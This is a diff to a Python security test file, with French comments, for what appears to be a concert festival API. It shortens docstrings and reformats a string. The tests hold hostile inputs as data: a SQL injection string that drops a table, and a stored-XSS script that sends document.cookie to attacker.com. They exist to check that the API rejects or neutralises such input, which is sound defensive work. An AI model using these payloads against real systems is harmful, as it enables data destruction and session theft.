@@ -40,14 +40,14 @@ def test_security_headers_present_on_endpoints(client):
     ],
 )
 def test_sqli_in_query_parameters_fails_safe(client, sqli_payload):
-    """Vérifie qu'une tentative d'injection SQL dans un paramètre de requête est rejetée en amont par typage strict."""
+    """Une injection SQL dans un paramètre de requête est rejetée en amont par le typage strict."""
     r = client.get(f"/concerts?festival_id={sqli_payload}")
     # Doit être rejeté (422 Unprocessable Entity car festival_id attend un entier)
     assert r.status_code == 422
 
 
 def test_sqli_payload_in_text_body_is_safely_parameterized(client):
-    """Vérifie qu'un payload SQL inséré dans un champ textuel est traité comme une chaîne littérale pure et n'altère pas la base."""
+    """Un payload SQL dans un champ textuel est traité comme du texte littéral et n'altère pas la base."""
     # 1. Créer un artiste dont le nom contient un payload d'injection destructeur
     sqli_name = "Black Metal'); DROP TABLE festivals;--"
     r_artist = client.post(
@@ -124,7 +124,9 @@ def test_xss_injection_in_incident_description_is_sanitized(client):
     concert_id = r_concert.json()["id"]
 
     # 2. Déclarer un incident avec une tentative de Stored XSS
-    malicious_description = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>Panne de console"
+    malicious_description = (
+        "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>Panne de console"
+    )
     r_inc = client.post(
         "/incidents",
         json={
@@ -145,7 +147,7 @@ def test_xss_injection_in_incident_description_is_sanitized(client):
 # =====================================================================
 
 def test_oversized_payload_rejected(client):
-    """Vérifie que les chaînes démesurées sont rejetées pour prévenir les attaques par saturation mémoire (DoS)."""
+    """Les chaînes démesurées sont rejetées pour prévenir une saturation mémoire (DoS)."""
     huge_string = "A" * 5000  # max_length autorisé pour incident est 2000
     r = client.post(
         "/incidents",
